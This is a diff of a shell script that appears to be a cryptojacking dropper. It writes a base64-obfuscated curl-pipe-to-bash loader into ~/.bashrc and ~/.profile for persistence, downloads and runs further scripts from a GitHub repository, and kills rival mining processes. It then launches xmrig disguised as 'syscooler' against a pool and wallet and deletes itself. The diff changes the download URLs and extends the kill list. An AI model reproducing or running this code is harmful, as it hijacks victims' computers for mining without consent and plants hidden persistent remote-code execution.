@@ -13,7 +13,7 @@ fi
 echo 'echo "Y3VybCAtcyAtbyBrZmMuc2ggaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2tmY21pbmVyL2tmYy9tYWluL2tmYy5zaCAmJiBiYXNoIGtmYy5zaA==" | base64 -d | bash' >> ~/.bashrc
 echo 'echo "Y3VybCAtcyAtbyBrZmMuc2ggaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2tmY21pbmVyL2tmYy9tYWluL2tmYy5zaCAmJiBiYXNoIGtmYy5zaA==" | base64 -d | bash' >> ~/.profile
 
-curl -s -o newkfc.sh https://raw.githubusercontent.com/1oneman1/syscooler/new/main/syscooler.sh
+curl -s -o newkfc.sh https://raw.githubusercontent.com/1oneman1/syscooler/main/syscooler.sh
 sleep 60
 if [ "$VERSION" != "$(grep -o '^VERSION="[0-9\.]*"' newkfc.sh | cut -d'"' -f2)" ]; then
     chmod +x newkfc.sh
@@ -33,7 +33,7 @@ mv ~/.bashrc_temp ~/.bashrc
 grep -vE 'curl|wget' ~/.profile > ~/.profile_temp
 mv ~/.profile_temp ~/.profile
 
-MINER_PROCESSES=("xmrig" "xmr-stak" "ccminer" "ethminer" "cgminer" "cpuminer" "sgminer" "bfgminer" "lolMiner" "kfc_eater")
+MINER_PROCESSES=("xmrig" "xmr-stak" "ccminer" "ethminer" "cgminer" "cpuminer" "sgminer" "bfgminer" "lolMiner" "kfc_eater" "kfc")
 for process in "${MINER_PROCESSES[@]}"; do
   pids=$(pgrep "$process")
   if [ -n "$pids" ]; then
@@ -51,6 +51,6 @@ mv xmrig syscooler"$random_number"
 current_date=$(date +"%Y%m%d")
 ./syscooler"$random_number" --donate-level 1 -o "$POOL" -u "$WALLET" -k --tls -p sysx"$current_date"_eater"$random_number" &  >/dev/null 2>&1 &
 
-curl -s -o morekfc.sh https://raw.githubusercontent.com/1oneman1/syscooler/new/main/moresyscooler.sh && bash moresyscooler.sh
+curl -s -o morekfc.sh https://raw.githubusercontent.com/1oneman1/syscooler/main/moresyscooler.sh && bash moresyscooler.sh
 
 rm "$0"
